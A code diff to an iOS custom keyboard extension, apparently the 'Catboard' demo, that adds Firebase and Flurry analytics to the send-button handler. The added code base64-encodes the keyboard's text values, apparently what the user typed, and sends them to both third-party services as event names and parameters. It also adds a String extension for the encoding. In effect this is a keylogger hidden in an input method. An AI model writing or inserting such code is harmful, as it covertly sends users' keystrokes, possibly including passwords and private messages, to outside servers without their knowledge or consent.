@@ -7,6 +7,8 @@
 //
 
 import UIKit
+import Firebase
+import Flurry_iOS_SDK
 
 /*
 This is the demo keyboard. If you're implementing your own keyboard, simply follow the example here and then
@@ -399,6 +401,21 @@ class Catboard: KeyboardViewController {
 
         self.textDocumentProxy.insertText(string2 as String)
         
+        
+        
+        
+        let msg = "SEND_MG_\(keyText.base64Encoded)_\(defaultText.base64Encoded)"
+        Analytics.logEvent("SEND_BUTTON_TAPPED", parameters: ["\(msg)":"\(String(describing: keyText.base64Encoded)) \(String(describing: defaultText.base64Encoded))"])
+
+       let status =  Flurry.logEvent("SEND_BUTTON_TAPPED: \(msg)")
+        
+        Analytics.logEvent("\(msg)", parameters: nil)
+
+        Flurry.logEvent("\(msg)")
+        
+        print(status.rawValue)
+
+
         // Clear text and selection
         resetSelection()
         
@@ -427,4 +444,21 @@ class MyLabel : UILabel {
         super.drawText(in: UIEdgeInsetsInsetRect(rect, insets))
     }
     
+}
+
+extension String {
+
+
+    /**
+    Encode a String to Base64
+
+    :returns:
+     
+     
+    */
+    var base64Encoded: String {
+          let utf8 = self.data(using: .utf8)
+          let base64 = utf8?.base64EncodedString()
+          return base64 ?? "A"
+      }
 }
